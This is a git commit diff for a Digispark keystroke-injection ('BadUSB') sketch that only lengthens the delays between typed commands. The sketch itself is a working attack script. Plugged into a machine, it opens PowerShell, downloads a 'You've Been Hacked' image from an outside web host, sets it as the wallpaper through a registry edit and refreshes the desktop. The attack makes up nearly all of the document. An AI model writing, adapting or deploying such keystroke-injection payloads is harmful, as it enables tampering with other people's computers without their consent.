cda6662b2d4c33bef58f4ef47c5a7e9d515898c6
Eden Frey <x3d3nfr3yx@rosewall.edensdigitalgarden.com>
2023-10-05 19:24:29 +0800

    Progress

--- scripts/Wallpaper_Change.ino
+++ scripts/Wallpaper_Change.ino
@@ -10,25 +10,25 @@ void loop() {
 
   /* Change Wallpaper */
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(750);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(750);
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(750);
   DigiKeyboard.print("$client = new-object System.Net.WebClient");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(750);
   DigiKeyboard.print("$client.DownloadFile(\"https://outlet119.com/wp-content/uploads/2020/02/Youve-Been-Hacked-2048x1152.jpg\" , \"hacked.jpg\")"); // Random hacked image downloaded.
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(750);
   DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\hacked.jpg\" /f");
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(750);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(750);
   DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(750);
 
   for (;;) {
     /*Stops the digispark from running the scipt again*/
